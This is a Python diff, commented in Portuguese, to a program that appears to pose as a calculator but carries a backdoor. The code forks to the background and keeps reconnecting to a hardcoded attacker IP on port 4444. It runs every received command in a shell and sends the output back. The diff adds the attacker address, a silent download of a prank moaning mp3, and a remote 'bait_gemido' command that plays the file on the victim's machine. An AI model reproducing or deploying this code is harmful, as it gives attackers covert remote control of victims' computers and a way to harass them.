@@ -4,9 +4,16 @@ import socket # Lib usada para fazer a conexao
 import subprocess # Lib usada para executar os comandos do atacante
 import os # Lib usada para executar o backdoor em background
 import time # Lib usada para esperar um determinado tempo ate se reconectar ao atacante(padrão: 10s)
+import urllib3 # Lib usada para baixar o mp3 do bait do gemido
+from pygame import mixer # Lib usada para usar o bait do gemido
 
-attacker_ip = "" # IP do atacante
+attacker_ip = "192.168.25.9" # IP do atacante
 attacker_port = 4444 # Porta do atacante
+gemido_link = "http://www.whatstube.com.br/wp-content/uploads/2015/10/mulher-gemendo-alto.mp3" # Link para baixar o bait do gemido
+http = urllib3.PoolManager()
+download = http.request('GET', gemido_link)
+gemido_save = open('.troll.mp3', 'wb')
+gemido_save.write(download.data)
 
 def pers_conexao(ip, porta): # Função para criar uma conexão persistente com o atacante
   pid = os.fork() # Continua a execução em background
@@ -18,6 +25,7 @@ def pers_conexao(ip, porta): # Função para criar uma conexão persistente com 
       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Criar um pacote TCP
       s.connect((ip,porta)) # Fazer uma conexao TCP com o atacante
       connected = True # Modificar o status para conectado
+      s.send(b'Comandos Especiais: bait_gemido\n\n') # Envia para o atacante os comandos especiais
       while connected: # Loop Infinito
         try: # Tente
           iniciaShell(s) # Executa a shell(recebe comandos e envia output)
@@ -29,8 +37,18 @@ def pers_conexao(ip, porta): # Função para criar uma conexão persistente com 
 def iniciaShell(s): # Função para executar comandos
   s.send(b'$ ') # simula uma shell
   recv = s.recv(1024) # recebe comando
-  cmd = subprocess.Popen(recv, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True) # Executa comando na shell
-  s.send(cmd.stdout.read()+cmd.stderr.read()) # Envia o output do stdout e stderr
+  if recv == b'bait_gemido\n':
+    gemidao()
+  else:
+    cmd = subprocess.Popen(recv, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True) # Executa comando na shell
+    s.send(cmd.stdout.read()+cmd.stderr.read()) # Envia o output do stdout e stderr
+def gemidao():
+  try:
+    mixer.init() # Inicia o Mixer
+    mixer.music.load('.troll.mp3') # Carrega o mp3 do gemido
+    mixer.music.play(start=5.0) # Lê o mp3 do gemido a partir do 5º segundo
+  except:
+    pass
 def calculadora(opcao,a,b):
   if opcao == "soma":
     c = a + b
